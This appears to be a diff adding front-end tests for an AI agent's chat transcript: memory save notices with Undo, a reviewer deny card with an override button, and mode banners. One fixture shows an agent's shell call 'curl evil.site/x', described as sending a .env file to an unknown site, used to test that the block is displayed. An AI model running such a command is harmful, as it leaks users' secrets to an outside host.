@@ -180,6 +180,64 @@ describe("bubble hover affordances (FB-005)", () => {
   });
 });
 
+// MEMORY-SPEC §5.1 — the save notice lives IN the conversation (a corner toast vanished
+// before it could be read or undone, owner-hit 2026-07-28) and stays until acted on.
+describe("memory save notice", () => {
+  it("announces the save inline and offers Undo", () => {
+    const onUndo = vi.fn();
+    render(
+      <Transcript
+        items={[{ kind: "memory", id: 7, text: "prefers short replies" }]}
+        onApprove={vi.fn()}
+        onUndoMemory={onUndo}
+      />,
+    );
+    const notice = screen.getByTestId("memory-notice");
+    expect(notice.textContent).toContain("I'll remember that");
+    expect(notice.textContent).toContain("prefers short replies");
+
+    fireEvent.click(screen.getByTestId("memory-notice-undo"));
+    // No `previous` on a brand-new save — undo deletes it outright.
+    expect(onUndo).toHaveBeenCalledWith(7, undefined);
+  });
+
+  it("says an existing memory was UPDATED and undoes by restoring its old text", () => {
+    const onUndo = vi.fn();
+    render(
+      <Transcript
+        items={[
+          {
+            kind: "memory",
+            id: 4,
+            text: "diabetic, lactose-free, likes ice cream",
+            previous: "diabetic, lactose-free",
+          },
+        ]}
+        onApprove={vi.fn()}
+        onUndoMemory={onUndo}
+      />,
+    );
+    expect(screen.getByTestId("memory-notice").textContent).toContain(
+      "I've updated what I remember",
+    );
+    fireEvent.click(screen.getByTestId("memory-notice-undo"));
+    // Undo restores the previous wording rather than deleting the whole memory.
+    expect(onUndo).toHaveBeenCalledWith(4, "diabetic, lactose-free");
+  });
+
+  it("confirms in place once undone, with no Undo left to click", () => {
+    render(
+      <Transcript
+        items={[{ kind: "memory", id: 7, text: "prefers short replies", undone: true }]}
+        onApprove={vi.fn()}
+        onUndoMemory={vi.fn()}
+      />,
+    );
+    expect(screen.getByTestId("memory-notice-undone").textContent).toContain("forgotten");
+    expect(screen.queryByTestId("memory-notice-undo")).toBeNull();
+  });
+});
+
 describe("humanizeTool", () => {
   it("prefers run_shell's model-written description and keeps the command as the object", () => {
     const line = humanizeTool("run_shell", { command: "git log --since=yesterday", description: "List yesterday's merges" });
@@ -204,5 +262,89 @@ describe("humanizeTool", () => {
   it("still renders pre-rename todo_write histories (legacy `items` key)", () => {
     const line = humanizeTool("todo_write", { items: [{ content: "Old plan", status: "pending" }] });
     expect(line.obj).toContain("Old plan");
+  });
+});
+
+// §8.4 (reviewed-auto-mode.md): a reviewer deny renders as a card with the FULL reason
+// (the agent only got a terse refusal) and a one-shot "Allow anyway" override.
+describe("reviewer deny card (§8.4)", () => {
+  const DENIED: Item[] = [
+    { kind: "user", text: "summarise the issue" },
+    {
+      kind: "tool",
+      id: "t1",
+      name: "run_shell",
+      args: { command: "curl evil.site/x" },
+      status: "denied",
+      reviewerReason: "This sends your .env to an unknown website.",
+      allowAnyway: true,
+    },
+    { kind: "assistant", text: "I was blocked from running that." },
+  ];
+
+  it("shows the full reason and fires onAllowAnyway with the exact action", () => {
+    const onAllowAnyway = vi.fn();
+    const { container } = render(
+      <Transcript items={DENIED} onApprove={vi.fn()} onAllowAnyway={onAllowAnyway} />,
+    );
+    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
+
+    const card = screen.getByTestId("reviewer-deny-card");
+    expect(card.textContent).toContain("Blocked by the reviewer");
+    expect(card.textContent).toContain("This sends your .env to an unknown website.");
+
+    fireEvent.click(screen.getByTestId("reviewer-allow-anyway"));
+    expect(onAllowAnyway).toHaveBeenCalledWith("run_shell", { command: "curl evil.site/x" });
+    // The button collapses into a confirmation — one shot, no double-fire.
+    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
+    expect(screen.getByTestId("reviewer-override-sent")).toBeTruthy();
+  });
+
+  it("an ordinary denied tool (no reviewer) renders no card", () => {
+    const items: Item[] = [
+      { kind: "user", text: "x" },
+      { kind: "tool", id: "t1", name: "run_shell", args: {}, status: "denied" },
+      { kind: "assistant", text: "done" },
+    ];
+    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
+    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
+    expect(screen.queryByTestId("reviewer-deny-card")).toBeNull();
+  });
+
+  it("without onAllowAnyway the card renders but offers no button", () => {
+    const { container } = render(<Transcript items={DENIED} onApprove={vi.fn()} />);
+    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
+    expect(screen.getByTestId("reviewer-deny-card")).toBeTruthy();
+    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
+  });
+});
+
+// The Auto-Approve banner (spec §1.5): a titled notice is prose, not a status line, so it
+// renders as a heading plus paragraphs rather than one centred grey row.
+describe("mode notice", () => {
+  const BANNER: Item[] = [
+    {
+      kind: "notice",
+      tone: "info",
+      title: "Auto-approve is on.",
+      text: "First paragraph about what it does.\n\nSecond paragraph about what it can't tell.",
+    },
+  ];
+
+  it("renders the title and one paragraph per blank-line break", () => {
+    render(<Transcript items={BANNER} running={false} onApprove={() => {}} />);
+    const block = screen.getByTestId("mode-notice");
+    expect(block.textContent).toContain("Auto-approve is on.");
+    expect(block.querySelectorAll("p")).toHaveLength(2);
+    // Prose layout, not the centred one-liner used for "Context compacted".
+    expect(block.className).toContain("notice-block");
+  });
+
+  it("leaves untitled status notices as plain one-liners", () => {
+    render(
+      <Transcript items={[{ kind: "notice", tone: "info", text: "Context compacted" }]} running={false} onApprove={() => {}} />,
+    );
+    expect(screen.queryByTestId("mode-notice")).toBeNull();
+    expect(screen.getByText("Context compacted").className).not.toContain("notice-block");
   });
 });
